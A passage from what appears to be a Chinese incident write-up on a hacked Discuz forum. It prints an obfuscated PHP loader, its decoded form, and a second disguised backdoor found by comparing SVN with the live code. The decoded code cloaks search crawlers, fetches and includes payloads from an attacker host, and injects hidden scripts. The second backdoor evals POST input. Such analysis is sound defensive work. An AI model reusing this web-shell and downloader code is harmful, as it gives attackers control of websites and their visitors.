xOXNudkxVbEVUc252TFVpc2toU1pkQ29xMGxFWlRzYmcxQlNzOXFTdjR1aktTQ2lLYUlmdjFVTUVXSGpIZDdneXVqaktUUFdLUjl5S1NIU3ZrZGxFVHNiRUxzbnZMVWIyVTZTWnBkU3NVd1N2NVBpdkpDbEZ3dEVwVUJTc3R3aTN0VWxFVHNiRWQ3Z3l1am52ZnVTdjFxV2VkdWpLVFBXS1JDbFp6N3llYUlpS1VJbkhwZFNzVXdTdjVQaXZKQ1gzalVXZWFIaU9oOWd5dWpTS2FPQUtUVWxFVHNudkxVVEtVSE1FVGRmbVRQbEZ3dEVyMHBTdkxjU1p6N2d5dWpqS1RQV0tSOVMyYTBTS2swZlpwcm5lVDBiZ3VWTTJqVVdFNWRubXRPV211SWYyOWhNc1RVTTNicWIyUENGMjgzTXJ6dWJnOUdGMXRKTlpiSWprOUZUYWp2VGFqaWowUEpha3pEWlI5RmFFV1dsRnd0RXBkZFNyQjl5S1NWYkthSWxFVHNudkxVaXNraFNacXJXSGJDWHEwbEVKenNXM2pDV0tKdWpLU3FNRVRkZm1UUGxGd3RFcFVCU3N0d2kzdFVsRVRzYkVkN2d5dWpudmZ1YjNUSGlLYUlsRVRkZm1UUGxaQitHZ1JxQWdCQ0dld3RFcFVkU3ZBcVNLSnVqS1NDaUthUm5tR3dqS1RQV0tSQ1hxMGxFbTB0RXIxOWd5Q0NTUXBQbnY1RGZtakhmbWR1alJVeU1FVE1aYUJDbG13dEVzU1Zic2FQZjJwdWpSaEVpM3lwZm1BcGpSaEVpM1RjbG1oQ1NRUGNXZWpDYjNUSGxFVEVpM3l3alJoRWkzVGNsWlU3Z3lDY25LOTNsRVRzbnZMVVRLVUhsRnd0RXIxOVNzOUhTdmtPbkVwZFoyYTVHS2tjR0VUTVNtVWNsbXd0RXNVc2xldDBic1VjV2VHdWpralVTUXFkWjJhNWJIZENvcTBsU3Z0dWlIQlFOS1RDV1F6Y1dlVXdTRjByU0tVY2JLTFBvRkNJaTI1VWpjNDhiMnRIbm16MEdLTFBpc1cxZnZXVU5aV3hmbVNQYjJ0SG5tejBqSHpjYnNBOWoyUDBXZUI2TUg5T2kzYUlXZ0FMTU9KTG92YWNNc3RWaVo5T2lLVU9uSDVQYjN6NE4yVWRORkFMQWdkMEFnQTBBSFN3aTJXVk5GUnJHS3R1Zm1qY1NteTlqMldRQU9BTEFRYitORTljZjNqQ2JleStORTlkbm1mK05ldE9ic1VxV0V6MG9telVOWlcwU21QME0yQ1BXc2tjZjNqQ2JleXJHZXRIZmMwcm5lVDBiZ3VWTTJrcW5aNWRubXRPV211SWYyOWhNc1RVTTF0VWlINXhiSGIrTkU5Y2YzakNiZXkrR09oOURtMHRFcD09IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw==\"</span><span style=\"text-decoration: underline;\">));</span><span style=\"color: #cc99cc; text-decoration: underline;\">?&gt;</span>\n</pre>\n</div>\n</li>\n\n<li>参考 <a href=\"http://blog.i1728.com/post/99.html\">网上方法</a> 解码的结果\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php</span>\n<span style=\"color: #999999; font-style: italic;\">/*</span>\n<span style=\"color: #999999; font-style: italic;\">*author:whoami</span>\n<span style=\"color: #999999; font-style: italic;\">*  QQ  :4892057</span>\n<span style=\"color: #999999; font-style: italic;\">*/</span>\nerror_reporting(0);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span> = <span style=\"color: #66cccc;\">'/var/tmp/.SYSDUMP/'</span>;\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">IP</span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'REMOTE_ADDR'</span>];\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Bot</span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_USER_AGENT'</span>];\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Ref</span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_REFERER'</span>];\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">KIP</span>=<span style=\"color: #99cc99;\">array</span>(<span style=\"color: #66cccc;\">'117.28.255.37'</span>,<span style=\"color: #66cccc;\">'116.55.241.24'</span>,<span style=\"color: #66cccc;\">'125.64.94.219'</span>,<span style=\"color: #66cccc;\">'119.147.114.213'</span>,<span style=\"color: #66cccc;\">'11</span><span style=\"color: #66cccc; text-decoration: underline;\">8.122.188.194'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'60.172.229.61'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'61.188.39.16'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'61.147.98.198'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'61.129.45.72'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'113.98.254.245'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'58.221.61.128'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'117.34.73.70'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'58.215.190.84'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'117.28.255.53'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'183.91.40.144'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'117.21.220.245'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'122.228.200.46'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'61.164.150.70'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'61.147.108.41'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'116.55.242.138'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'114.80.222.242'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'61.147.108.41'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'116.255.230.70'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'222.186.24.26'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'222.186.24.59'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'220.181.158.106'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'123.125.160.215'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">KBot</span>=<span style=\"color: #99cc99;\">array</span>(<span style=\"color: #66cccc;\">'Baiduspider'</span>,<span style=\"color: #66cccc;\">'Googlebot'</span>,<span style=\"color: #66cccc;\">'Yahoo'</span>,<span style=\"color: #66cccc;\">'Bingbot'</span>,<span style=\"color: #66cccc;\">'Sosospider'</span>,<span style=\"color: #66cccc;\">'Sogou'</span>,<span style=\"color: #66cccc;\">'36</span><span style=\"color: #66cccc; text-decoration: underline;\">0Spider'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'YoudaoBot'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Key</span>=<span style=\"color: #99cc99;\">array</span>(<span style=\"color: #66cccc;\">'anquan.org'</span>,<span style=\"color: #66cccc;\">'google.com'</span>,<span style=\"color: #66cccc;\">'soso.com'</span>,<span style=\"color: #66cccc;\">'%e8%b5%8c'</span>,<span style=\"color: #66cccc;\">'%e9%aa%b0'</span>,<span style=\"color: #66cccc;\">'%e9%b1%</span><span style=\"color: #66cccc; text-decoration: underline;\">bc'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%89%9b'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%8d%9a%e5%bd%a9'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%99%be%e5%ae%b6'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%a3%8b%e7%89%8c'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%b8%b8%e6%88%8f'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%a8%b1%e4%b9%90'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%9b%bd%e9%99%85'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%9c%9f%e4%ba%ba'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%9c%9f%e9%92%b1'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%8e%b0%e9%87%91'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%b3%a8%e5%86%8c'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%bc%80%e6%88%b7'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%bd%a9%e9%87%91'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e8%b5%9a%e9%92%b1'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e6%8f%90%e7%8e%b0'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e7%ad%96%e7%95%a5'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e8%af%95%e7%8e%a9'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%b9%b3%e5%8f%b0'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">dec0de</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>){\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">dataArr</span> = explode(<span style=\"color: #66cccc;\">':'</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Keys</span> = explode(<span style=\"color: #66cccc;\">':'</span>,base64_decode(str_rot13(pack(<span style=\"color: #66cccc;\">'H*'</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">dataArr</span>[0]))));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">News</span> = explode(<span style=\"color: #66cccc;\">':'</span>,base64_decode(str_rot13(pack(<span style=\"color: #66cccc;\">'H*'</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">dataArr</span>[1]))));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Links</span>= explode(<span style=\"color: #66cccc;\">':'</span>,base64_decode(str_rot13(pack(<span style=\"color: #66cccc;\">'H*'</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">dataArr</span>[2]))));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">@include</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>.<span style=\"color: #66cccc;\">'.Wh0AmI.MODEL'</span>);<span style=\"color: #99cc99;\">die</span>;\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">getdata</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data_url</span>){\n<span style=\"color: #99cc99;\">if</span> (function_exists(<span style=\"color: #66cccc;\">'curl_exec'</span>)) {\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span> = @curl_init();\ncurl_setopt(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span>, <span style=\"color: #6699cc;\">CURLOPT_URL</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data_url</span>);\ncurl_setopt(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span>, <span style=\"color: #6699cc;\">CURLOPT_HEADER</span>, 0);\ncurl_setopt(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span>, <span style=\"color: #6699cc;\">CURLOPT_CONNECTTIMEOUT</span>, 5);\ncurl_setopt(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span>, <span style=\"color: #6699cc;\">CURLOPT_RETURNTRANSFER</span>, 1);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">contents</span> = @curl_exec(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span>);\n@curl_close(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_curl</span>);\n}<span style=\"color: #99cc99;\">elseif</span>(function_exists(<span style=\"color: #66cccc;\">'stream_context_create'</span>)) {\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_cont</span> = <span style=\"color: #99cc99;\">array</span>(<span style=\"color: #66cccc;\">'http'</span> =&gt; <span style=\"color: #99cc99;\">array</span>(<span style=\"color: #66cccc;\">'method'</span> =&gt; <span style=\"color: #66cccc;\">'GET'</span>,<span style=\"color: #66cccc;\">'timeout'</span> =&gt; 5));\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_stre</span> = @stream_context_create(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_cont</span>);\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">contents</span> = @file_get_contents(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data_url</span>, <span style=\"color: #6699cc;\">false</span>, <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">sp_stre</span>);\n}<span style=\"color: #99cc99;\">else</span>{\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">handle</span> = <span style=\"color: #6699cc;\">@fopen</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data_url</span>, <span style=\"color: #66cccc;\">\"rb\"</span>);<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">contents</span> = @stream_get_contents(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">handle</span>);<span style=\"color: #f99157; background-color: #515151;\"> </span>\n<span style=\"color: #6699cc;\">@fclose</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">handle</span>);\n}\n<span style=\"color: #99cc99;\">return</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">contents</span>;\n}\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">show</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>){\n<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">filename</span>=<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>.md5(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_HOST'</span>].<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'REQUEST_URI'</span>]);\n<span style=\"color: #99cc99;\">if</span>(is_file(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">filename</span>)){\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fp</span>=<span style=\"color: #6699cc;\">@fopen</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">filename</span>,<span style=\"color: #66cccc;\">'r'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>=<span style=\"color: #6699cc;\">@fread</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fp</span>,filesize(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">filename</span>));\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">@fclose</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fp</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(<span style=\"color: #99cc99;\">empty</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>)) {<span style=\"color: #6699cc;\">@unlink</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">filename</span>);<span style=\"color: #99cc99;\">return</span>;}\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   dec0de(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>);\n} <span style=\"color: #99cc99;\">else</span> {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>=getdata(<span style=\"color: #66cccc;\">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">_SERVER</span>[<span style=\"color: #66cccc;\">'HTTP_H</span><span style=\"color: #66cccc; text-decoration: underline;\">OST'</span><span style=\"text-decoration: underline;\">]);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fp</span>=<span style=\"color: #6699cc;\">@fopen</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">filename</span>,<span style=\"color: #66cccc;\">'w'</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">@fwrite</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fp</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #6699cc;\">@fclose</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fp</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">if</span>(strlen(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>) &gt; 1000) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   dec0de(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">data</span>);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n}}\n<span style=\"color: #99cc99;\">if</span>(<span style=\"color: #6699cc;\">!</span>in_array(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">IP</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">KIP</span>)){\n<span style=\"color: #99cc99;\">foreach</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">KBot</span> <span style=\"color: #99cc99;\">as</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">KBots</span>){<span style=\"color: #99cc99;\">if</span>(stristr(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Bot</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">KBots</span>)){\nshow(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fileDir</span>);\n}}<span style=\"color: #99cc99;\">foreach</span>(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Key</span> <span style=\"color: #99cc99;\">as</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Keys</span>){\n<span style=\"color: #99cc99;\">if</span>(stristr(<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Ref</span>,<span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">Keys</span>)){\n<span style=\"color: #99cc99;\">echo</span> <span style=\"color: #66cccc;\">\"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style=\"color: #66cccc; text-decoration: underline;\">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;\"</span><span style=\"text-decoration: underline;\">;}}}</span>\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n上面代码的目的就是下载恶意代码并执行。  \n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">继续排查</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n通过比较svn中的代码与现网的代码还发现了一个新的后门程序\n</p>\n\n<ul class=\"org-ul\">\n<li><code>uc_client/control/class.php</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-php\"><span style=\"color: #cc99cc;\">&lt;?php</span> <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">mt</span>=<span style=\"color: #66cccc;\">\"mFsKCleRfU\"</span>; <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">ojj</span>=<span style=\"color: #66cccc;\">\"IEBleldle\"</span>; <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">hsa</span>=<span style=\"color: #66cccc;\">\"E9TVFsnd2VuJ10p\"</span>; <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66;\">fnx</span>=<span style=\"color: #66cccc;\">\"Ow==\"</span>; <span style=\"color: #cccccc; background-color: #2d2d2d;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">zk</span><span style=\"text-decoration: underline;\"> = str_replace(</span><span style=\"color: #66cccc; text-decoration: underline;\">\"d\"</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">\"sdtdrd_redpdldadcde\"</span><span style=\"text-decoration: underline;\">); </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">ef</span><span style=\"text-decoration: underline;\"> = </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">zk</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #66cccc; text-decoration: underline;\">\"z\"</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #66cccc; text-decoration: underline;\">\"zbazsze64_zdzeczodze\"</span><span style=\"text-decoration: underline;\">); </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">dva</span><span style=\"text-decoration: underline;\"> = </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">zk</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #66cccc; text-decoration: underline;\">\"p\"</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"</span><span style=\"text-decoration: underline;\">,</span><span style=\"color: #66cccc; text-decoration: underline;\">\"pcprpepaptpe_fpupnpcptpipopn\"</span><span style=\"text-decoration: underline;\">); </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">zvm</span><span style=\"text-decoration: underline;\"> = </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">dva</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #66cccc; text-decoration: underline;\">''</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">ef</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">zk</span><span style=\"text-decoration: underline;\">(</span><span style=\"color: #66cccc; text-decoration: underline;\">\"le\"</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #66cccc; text-decoration: underline;\">\"\"</span><span style=\"text-decoration: underline;\">, </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">ojj</span><span style=\"text-decoration: underline;\">.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">mt</span><span style=\"text-decoration: underline;\">.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">hsa</span><span style=\"text-decoration: underline;\">.</span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">fnx</span><span style=\"text-decoration: underline;\">))); </span><span style=\"color: #cccccc; background-color: #2d2d2d; text-decoration: underline;\">$</span><span style=\"color: #ffcc66; text-decoration: underline;\">zvm</span><span style=\"text-decoration: underline;\">(); </span><span style=\"color: #cc99cc; text-decoration: 